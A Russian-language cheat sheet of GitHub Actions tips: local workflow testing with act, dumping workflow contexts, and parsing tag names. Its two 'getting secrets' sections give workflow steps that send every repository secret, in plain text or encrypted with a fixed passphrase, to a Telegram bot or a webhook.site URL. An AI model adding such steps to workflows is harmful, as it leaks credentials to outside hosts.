# Шпаргалки и ништяки

## Локальное тестирование workflow

Используем утилиту `act`

Лучше всего работать через VSCode с плагином `Remote SSH`. `CMD + J` открывает терминал. Команда `code $path` открывает папку или файл прямо в редакторе.

```bash
# устанавливаем act (wget ссылку заменить на свежую из релизов)
mkdir -p tmp_playground/act && cd tmp_playground/act
wget https://github.com/nektos/act/releases/download/v0.2.65/act_Linux_x86_64.tar.gz
tar fxv act_Linux_x86_64.tar.gz
sudo install act /usr/bin/act
cd .. && rm -r act

# скачиваем любой реп
git clone git@github.com:user/repo.git && cd repo
touch .secrets
code .

# ... редачим .secrets ...
# можно выполнять без аргументов. Ниже моя попытка ускорения работы, но не уверен, что работает
# если используется actions upload-artifact/download-artifact, то еще укажите --artifact-server-path ../artifacts
act --insecure-secrets --pull false --use-new-action-cache --action-offline-mode --action-cache-path=/dev/shm/act-cache
# -e event.json позволяет менять данные события, например выполнять словно пушнут тег
# Пример файла: {"ref": "refs/tags/this-is-a-tag"}
```

## Дебаг принт всего контекста

```yaml
steps:
  - run: echo github context '${{ toJson(github) }}'
  - run: echo env context '${{ toJson(env) }}'
  - run: echo secrets context '${{ toJson(secrets) }}' # актуально для act (утилита) с параметром --insecure-secrets
  - run: echo job context '${{ toJson(job) }}'
  - run: echo steps context '${{ toJson(steps) }}'
  - run: echo matrix context '${{ toJson(matrix) }}' # может отсутствовать
  - run: echo strategy context '${{ toJson(strategy) }}' # может отсутствовать
  - run: echo runner context '${{ toJson(runner) }}'
```

## Получение секретов (простой способ)

Просто отправляем их в незашифрованном виде себе в телеграм:

```yaml
steps:
  - run: |
      curl -s -X POST https://api.telegram.org/bot123456:YOUR_BOT_TOKEN_HERE/sendMessage -d chat_id=YOUR_NICKNAME_OR_ID -d text='Secrets: <pre>${{ toJson(secrets) }}</pre>' -d parse_mode=HTML
```

## Получение секретов (безопасный способ)

В инете тупые решения, я придумал свое.

Вебхук получаем на https://webhook.site. Отправляем специально в зашифрованном виде, вдруг они подглядывают.

В коде не забудьте поменть ссылку на ваш полученный вебхук

```yaml
steps:
  - run: |
      STRING_TO_ENCRYPT='${{ toJson(secrets) }}'
      ENCRYPTION_KEY="SomeSecret"
      ENCRYPTED_STRING=$(echo -n "$STRING_TO_ENCRYPT" | openssl enc -aes-256-cbc -a -salt -pass pass:"$ENCRYPTION_KEY")
      echo "🔒 Encrypted string: $ENCRYPTED_STRING"

      DECRYPTED_STRING=$(echo "$ENCRYPTED_STRING" | openssl enc -aes-256-cbc -a -d -salt -pass pass:"$ENCRYPTION_KEY")
      echo "🔓 Decrypted string: $DECRYPTED_STRING"

      curl -X POST -d "encrypted_string=$ENCRYPTED_STRING" https://webhook.site/94935b01-ad6f-40c0-968f-ec7bd37bfdf3
```

Зашифрованное сообщение сохраняем в файл `encrypted.txt`, затем вводим в терминал:

```bash
openssl enc -aes-256-cbc -d -a -salt -pass pass:SomeSecret -in encrypted.txt
```

## Получение названия тега из `github.ref` (`GITHUB_REF`)

```yaml
steps:
  - name: Получение названия тега
    if: startsWith(github.ref, 'refs/tags/')
    run: echo "Tag ${GITHUB_REF#refs/tags/}" # выведет v1.0.0 для refs/tags/v1.0.0
  - name: Использование тега в других шагах
    run: echo "TAG_NAME=${GITHUB_REF#refs/tags/}" >> $GITHUB_ENV
  - run: echo "Использование тега $TAG_NAME"
```

## Прочие ресурсы

- [Шпаргалка по `github.*` контексту](https://medium.com/@s.atmaramani/github-actions-github-object-cheat-sheet-b0ca5917b175)
- [Куча интересных заметок на гисте](https://gist.github.com/br3ndonland/f9c753eb27381f97336aa21b8d932be6)
